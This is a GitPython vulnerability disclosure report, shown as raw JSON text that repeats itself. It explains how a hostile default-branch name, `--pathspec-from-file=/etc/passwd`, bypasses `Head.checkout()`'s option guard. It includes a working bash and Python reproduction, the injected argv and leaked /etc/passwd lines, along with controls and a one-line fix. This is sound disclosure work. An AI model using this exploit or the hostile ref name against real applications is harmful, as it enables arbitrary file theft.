`--`.\n\n`git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\n```python\n        if not allow_unsafe_options:\n            Git.check_unsafe_options(\n                options=Git._option_candidates([], kwargs),\n                unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n            )\n        kwargs[\"f\"] = force\n        if kwargs[\"f\"] is False:\n            kwargs.pop(\"f\")\n\n        self.repo.git.checkout(self, **kwargs)\n```\n\n`self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\nand is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\nso keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\nfirst (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\nall do). `Head.checkout` does not.\n\n### Why the branch name is attacker-controlled\n\nGit accepts a refname whose branch component begins with `-` and contains `/`\n(`raw/02-refname-accepted-and-cloned.txt`):\n\n```\n\u003e\u003e\u003e git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0  stderr=''\n    =\u003e un refname que empieza con '-' y lleva '/' es VALIDO para git\n\n\u003e\u003e\u003e git -C \u003cbare\u003e update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n    exit=0  stderr=''\n\u003e\u003e\u003e git -C \u003cbare\u003e symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0\n    HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n    ref en disco como arbol jerarquico: True\n\n\u003e\u003e\u003e Repo.clone_from('file://\u003cbare\u003e', \u003cvictim\u003e)   # la app solo clona\n    ramas LOCALES creadas por el clone, sin que nadie las pida:\n      refs/heads/--pathspec-from-file=/etc/passwd\n    repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n    coincide con el nombre hostil: True\n```\n\nThe transcript above also shows the second half: `git clone` **materialises that branch locally on\nits own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\nA plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n(`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\na `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\ntransport, which exercises the same git wire protocol as `https://`; I did not test against a\nhosted forge, since that would mean writing to a third party.\n\n### Why the leak reaches the caller\n\nThe file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n(`git/exc.py`):\n\n```python\n        self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\n    def __str__(self) -\u003e str:\n        return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n            self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n        )\n```\n\nSo `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\nfile. The developer does not have to know `.stderr` exists.\n\n### Full chain\n\n```\nRepo.clone_from(\u003cattacker URL\u003e)\n  ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n  ↓  git clone creates that LOCAL branch unasked\nrepo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n  ↓\nHead.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n  ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\ngit checkout --pathspec-from-file=/etc/passwd\n  ↓  git emits one `error:` per unmatched pathspec — one per line of the file\nGitCommandError → CommandError.__str__ → the consumer\n```\n\n## Steps to Reproduce\n\nEnvironment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\ntemporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\nThe bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\nscenario under `raw/`. Minimal manual reproduction:\n\n```bash\npython3 -m venv /tmp/gp \u0026\u0026 /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\nW=$(mktemp -d)\ngit init -q -b main \"$W/a\"; echo x \u003e \"$W/a/f.txt\"\ngit -C \"$W/a\" add f.txt\ngit -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\ngit clone -q --bare \"$W/a\" \"$W/a.git\"\nSHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\n# the attacker names their default branch after the file they want\ngit -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\ngit -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\ncat \u003e \"$W/consumer.py\" \u003c\u003c'PYEOF'\nimport logging, sys, git\nlogging.basicConfig(level=logging.INFO, format=\"%(message)s\")\ntry:\n    repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n    repo.active_branch.checkout()                          # ensure a clean working tree\nexcept git.exc.GitCommandError:\n    logging.exception(\"clone failed\")\nPYEOF\n\n/tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n```\n\n### Raw Request\n\nThe real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\nThis is the command GitPython actually built — the branch name became an option:\n\n```\n  argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n```\n\n### Raw Response\n\nObserved output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\npathspec, which is one per line of the target file:\n\n```\nerror: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\nerror: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\nerror: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n```\n\n`raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\n```\nArchivo objetivo: /etc/passwd  (34 lineas no vacias)\n[CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n  repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n  -\u003e GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n```\n\n## Impact\n\nAn attacker who can get an application to clone a repository they control reads any file the\napplication's process can read, with the contents returned in band. `/etc/passwd` was recovered in\nfull (34 of 34 lines) in the run recorded in `poc.log`.\n\nThe attacker needs **no account and no privilege in the consuming application**, and no\nconfiguration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\nconsumer is six lines of ordinary code. This is the central use case of the library — CI systems,\nrepository importers, scanners and bots that clone user-supplied URLs.\n\n### Impact precondition\n\n**Holds if:** the consuming application clones a repository whose default branch name the attacker\nchose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\nwhich needs no branch-name input from the application at all.\n\n**Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n`git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n`receive-pack` accepts without `--force` or special configuration\n(`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\nwrites the branch name; `git clone` materialises it.\n\n**Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n(latest release) with git 2.55.0, in the single run recorded in `poc.log`\n(2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\n\n### Limits, stated plainly\n\n- Only the full long spelling works, because a refname cannot contain a space and is therefore a\n  single argv token; `git` rejects the abbreviated forms. This was established while developing the\n  payload and is **not** part of the attached run — the run exercises the working spelling only.\n- The attacker must know an absolute path to the target file.\n- Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n  repository none of them do, so the attacker controls this condition too.\n- The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n  unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n  first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n  `git checkout` on 2.55.0.\n\n## Negative control\n\nFull statement of what each control isolates and what would invalidate it: `negative-controls.md`.\nEvery batch opens **and closes** with a positive control; if the closing one does not fire, the batch\nis discarded.\n\n**Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n— the same payload via kwargs. Fires in every batch:\n`UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\nThis proves the guard exists, is active under the default, and recognises the option — so a null\nresult elsewhere cannot be the instrument failing to reach the code.\n\n**Negative control.** The identical call on a branch named `benigna`. One variable changes: the\nleading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\n**Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\nThe same payload against the two methods in `git/refs/head.py` that received the guard in the same\ncommit, 185 lines apart:\n\n```\n[CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n  HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n  Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n```\n\n`HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n(`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\nexplanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\n## Remediation\n\nOne line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\n```python\n                options=Git._option_candidates([self], kwargs),\n```\n\n**The other candidate was evaluated and rejected.** Writing\n`self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\nlibrary and would also cover future `git checkout` options — but it **changes the semantics and\nbreaks the method**: in `git checkout -- \u003carg\u003e`, everything after `--` is a *pathspec*, not a branch.\nThe command would stop switching branches and start restoring files. The `--` pattern works for\n`fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\noperands; it does not transfer here.\n\nFor defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\nalso close the weaker `PR:L` path. That is a separate, optional change.\n\n## Prior art and de-duplication\n\nAll GitPython advisories in the GitHub database were reviewed —\n`gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n(the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\ntwo rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\n- **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n  (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n  the positive control in every batch of this report. The **positional** path is not covered by it.\n\nNeighbours, none overlapping:\n\n- **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n  guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n  patch that did not come back to `head.py:286`.\n- **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n  leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n  to the guard; this one does not.\n- **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n  Different sink (filesystem path construction) and different impact (write and delete), but it\n  establishes that attacker-influenced ref names is a premise this project has already accepted.\n\n### No open fix proposal\n\nSearched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n`gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\nproposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\nguard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\nintroduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n`dup-check.md`.\n\n### The project's own tests carry the same asymmetry\n\n`test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\nreport is about:\n\n- `HEAD.reset` — the **positional** is tested (lines 304-308).\n- `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\nSo the positional variant is a case the suite already knows how to write; it just was not written\nfor `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\nrequires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\ndoes not deliver. Nothing in the project declares the positional acceptable here.\n\n### Why the one-line fix works, which is not obvious\n\n`Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\npath components (`reference.py:122-132`), so a `Head` constructed on\n`refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n`refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\nthe guard see that same serialised string, which is why the one-line change closes it.\n\n## Evidence\n\n| File | What it establishes |\n|---|---|\n| `poc.sh` | driver — runs all seven scenarios as one unit |\n| `poc.log` | full transcript of the single reference run |\n| `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n| `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n| `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n| `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n| `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n| `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n| `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n| `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n| `negative-controls.md` | what each control isolates and what would invalidate it |\n| `evidence.sha256` | integrity of every raw file and script |\n\n## Disclosure\n\nReported privately through GitHub private vulnerability reporting. No third-party systems were\ntouched: every repository in this report is a temporary local one, and all transport is `file://`.",
                "text": "\u003e **A note on the referenced files.** This report was submitted through GitHub's private\n\u003e vulnerability reporting API, which carries no attachments. Every transcript this report leans\n\u003e on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n\u003e per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n\u003e evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n\u003e to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n\u003e PoC scripts are self-contained and reproduce the result from a clean environment.\n\n---\n\n**Affected:** `\u003c= 3.1.62` — all published releases; also `main` @ `4905b4af`\n**Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n**Date:** 2026-09-10\n**Reporter:** MAXI8594\n\n---\n\n## Threat model\n\n| | |\n|---|---|\n| **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n| **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n| **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n| **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\n**On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\nadvisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\nreport asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\napplication had to pass an attacker-influenced value into the API. Here it passes nothing — the\nclone materialises the hostile branch on its own and `repo.active_branch` returns it\n(`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\nand lands at 6.5, matching the siblings.\n\n## Summary\n\n`Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\npositional argument — the branch name — which reaches the `git checkout` argv with no `--`\nseparator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\nconsumer that merely clones it and checks out the default branch return the entire contents of that\nfile to the caller.\n\nThis is the exact combination of two advisories the project already fixed:\n\n- **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *\"Arbitrary file read via `--pathspec-from-file` in\n  `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n  the guard to this exact method — but only for `**kwargs`.\n- **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n  bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n  positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n  but not to `git/refs/head.py:286`.\n\n`f2550b65` states in its own commit message that the audit found the positional variant and applied\nit to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\n\u003e \"The audit also found that **reset's positional commit could carry the option before its argument\n\u003e separator**. […] **Check reset's positional commit as well as keyword options**\"\n\n`HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\n## Affected Asset\n\n| | |\n|---|---|\n| Package | `GitPython` (PyPI) |\n| Affected versions | **`\u003c= 3.1.62`** — all published releases |\n| Latest release tested | `3.1.62` |\n| Also present on | `main` @ `4905b4af` |\n| Vulnerable file | `git/refs/head.py` |\n| Guard | line 286 — `Git._option_candidates([], kwargs)` |\n| Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n| CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\nThe version range was established by **blob hash against every tag**, not by dates: the sink line\n`self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\nin every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n`7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\nThe kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\napplies; earlier releases have the same sink with no guard at all.\n\n## Vulnerability Details\n\n### Root cause\n\n`git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\n```python\n@classmethod\ndef _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -\u003e List[str]:\n    \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n    options = [\n        option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n    ]\n```\n\nSo `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\narguments this method puts on the command line.* That is fine when the method has no\nattacker-influenced positional, or when it separates them with `--`.\n\n`git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\n```python\n        if not allow_unsafe_options:\n            Git.check_unsafe_options(\n                options=Git._option_candidates([], kwargs),\n                unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n            )\n        kwargs[\"f\"] = force\n        if kwargs[\"f\"] is False:\n            kwargs.pop(\"f\")\n\n        self.repo.git.checkout(self, **kwargs)\n```\n\n`self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\nand is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\nso keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\nfirst (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\nall do). `Head.checkout` does not.\n\n### Why the branch name is attacker-controlled\n\nGit accepts a refname whose branch component begins with `-` and contains `/`\n(`raw/02-refname-accepted-and-cloned.txt`):\n\n```\n\u003e\u003e\u003e git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0  stderr=''\n    =\u003e un refname que empieza con '-' y lleva '/' es VALIDO para git\n\n\u003e\u003e\u003e git -C \u003cbare\u003e update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n    exit=0  stderr=''\n\u003e\u003e\u003e git -C \u003cbare\u003e symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0\n    HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n    ref en disco como arbol jerarquico: True\n\n\u003e\u003e\u003e Repo.clone_from('file://\u003cbare\u003e', \u003cvictim\u003e)   # la app solo clona\n    ramas LOCALES creadas por el clone, sin que nadie las pida:\n      refs/heads/--pathspec-from-file=/etc/passwd\n    repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n    coincide con el nombre hostil: True\n```\n\nThe transcript above also shows the second half: `git clone` **materialises that branch locally on\nits own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\nA plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n(`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\na `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\ntransport, which exercises the same git wire protocol as `https://`; I did not test against a\nhosted forge, since that would mean writing to a third party.\n\n### Why the leak reaches the caller\n\nThe file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n(`git/exc.py`):\n\n```python\n        self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\n    def __str__(self) -\u003e str:\n        return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n            self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n        )\n```\n\nSo `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\nfile. The developer does not have to know `.stderr` exists.\n\n### Full chain\n\n```\nRepo.clone_from(\u003cattacker URL\u003e)\n  ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n  ↓  git clone creates that LOCAL branch unasked\nrepo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n  ↓\nHead.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n  ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\ngit checkout --pathspec-from-file=/etc/passwd\n  ↓  git emits one `error:` per unmatched pathspec — one per line of the file\nGitCommandError → CommandError.__str__ → the consumer\n```\n\n## Steps to Reproduce\n\nEnvironment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\ntemporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\nThe bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\nscenario under `raw/`. Minimal manual reproduction:\n\n```bash\npython3 -m venv /tmp/gp \u0026\u0026 /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\nW=$(mktemp -d)\ngit init -q -b main \"$W/a\"; echo x \u003e \"$W/a/f.txt\"\ngit -C \"$W/a\" add f.txt\ngit -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\ngit clone -q --bare \"$W/a\" \"$W/a.git\"\nSHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\n# the attacker names their default branch after the file they want\ngit -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\ngit -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\ncat \u003e \"$W/consumer.py\" \u003c\u003c'PYEOF'\nimport logging, sys, git\nlogging.basicConfig(level=logging.INFO, format=\"%(message)s\")\ntry:\n    repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n    repo.active_branch.checkout()                          # ensure a clean working tree\nexcept git.exc.GitCommandError:\n    logging.exception(\"clone failed\")\nPYEOF\n\n/tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n```\n\n### Raw Request\n\nThe real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\nThis is the command GitPython actually built — the branch name became an option:\n\n```\n  argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n```\n\n### Raw Response\n\nObserved output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\npathspec, which is one per line of the target file:\n\n```\nerror: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\nerror: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\nerror: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n```\n\n`raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\n```\nArchivo objetivo: /etc/passwd  (34 lineas no vacias)\n[CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n  repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n  -\u003e GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n```\n\n## Impact\n\nAn attacker who can get an application to clone a repository they control reads any file the\napplication's process can read, with the contents returned in band. `/etc/passwd` was recovered in\nfull (34 of 34 lines) in the run recorded in `poc.log`.\n\nThe attacker needs **no account and no privilege in the consuming application**, and no\nconfiguration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\nconsumer is six lines of ordinary code. This is the central use case of the library — CI systems,\nrepository importers, scanners and bots that clone user-supplied URLs.\n\n### Impact precondition\n\n**Holds if:** the consuming application clones a repository whose default branch name the attacker\nchose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\nwhich needs no branch-name input from the application at all.\n\n**Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n`git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n`receive-pack` accepts without `--force` or special configuration\n(`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\nwrites the branch name; `git clone` materialises it.\n\n**Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n(latest release) with git 2.55.0, in the single run recorded in `poc.log`\n(2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\n\n### Limits, stated plainly\n\n- Only the full long spelling works, because a refname cannot contain a space and is therefore a\n  single argv token; `git` rejects the abbreviated forms. This was established while developing the\n  payload and is **not** part of the attached run — the run exercises the working spelling only.\n- The attacker must know an absolute path to the target file.\n- Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n  repository none of them do, so the attacker controls this condition too.\n- The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n  unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n  first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n  `git checkout` on 2.55.0.\n\n## Negative control\n\nFull statement of what each control isolates and what would invalidate it: `negative-controls.md`.\nEvery batch opens **and closes** with a positive control; if the closing one does not fire, the batch\nis discarded.\n\n**Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n— the same payload via kwargs. Fires in every batch:\n`UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\nThis proves the guard exists, is active under the default, and recognises the option — so a null\nresult elsewhere cannot be the instrument failing to reach the code.\n\n**Negative control.** The identical call on a branch named `benigna`. One variable changes: the\nleading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\n**Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\nThe same payload against the two methods in `git/refs/head.py` that received the guard in the same\ncommit, 185 lines apart:\n\n```\n[CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n  HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n  Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n```\n\n`HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n(`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\nexplanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\n## Remediation\n\nOne line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\n```python\n                options=Git._option_candidates([self], kwargs),\n```\n\n**The other candidate was evaluated and rejected.** Writing\n`self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\nlibrary and would also cover future `git checkout` options — but it **changes the semantics and\nbreaks the method**: in `git checkout -- \u003carg\u003e`, everything after `--` is a *pathspec*, not a branch.\nThe command would stop switching branches and start restoring files. The `--` pattern works for\n`fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\noperands; it does not transfer here.\n\nFor defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\nalso close the weaker `PR:L` path. That is a separate, optional change.\n\n## Prior art and de-duplication\n\nAll GitPython advisories in the GitHub database were reviewed —\n`gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n(the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\ntwo rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\n- **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n  